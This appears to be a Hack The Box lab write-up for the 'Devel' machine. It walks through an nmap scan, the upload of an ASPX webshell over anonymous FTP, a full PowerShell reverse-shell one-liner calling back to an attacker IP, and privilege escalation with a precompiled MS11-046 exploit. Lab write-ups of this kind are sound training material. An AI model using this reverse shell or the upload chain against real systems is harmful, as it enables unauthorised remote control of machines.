---
featured_image: "/posts/Devel/devel.png"
title : HTB 14/20 Ready
published : true
date: 2021-04-23
author : PS
---
## Foothold
*nmap*
```bash
Nmap scan report for 10.10.10.5
Host is up (0.10s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.23 seconds
```
First let's try to get into the ftp
![[Pasted image 20210427194341.png]]

![[Pasted image 20210427194409.png]]
Nothing interesting  
Let's move to the port 80  
![[Pasted image 20210427194512.png]]
Ok, since the same files we see on the web page are the same as in the ftp , and we can use put on the ftp , I assume that we need to upload and open a  shell on the ftp and since is iis it has to be aspx  
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
![[Pasted image 20210427195656.png]]
## Getting User
Run 
```bash
powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.7',6969);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
And have a nc in the back  
And BOOM got user
## Getting Root
![[Pasted image 20210427200148.png]]
Always run systeminfo
![[Pasted image 20210427200342.png]]
After running Watson  on the machine , it reveals that is vuln to MS11-046 and many more , so we are gonna search for an exploit  
After searching for a while I've stumbled upon this super mega nice repo with exploits 
https://github.com/abatchy17/WindowsExploits
https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046
PRECOMPILED !!! this is wild :)))  
Use smb to get the exploit on the machine and get root  
PS out 
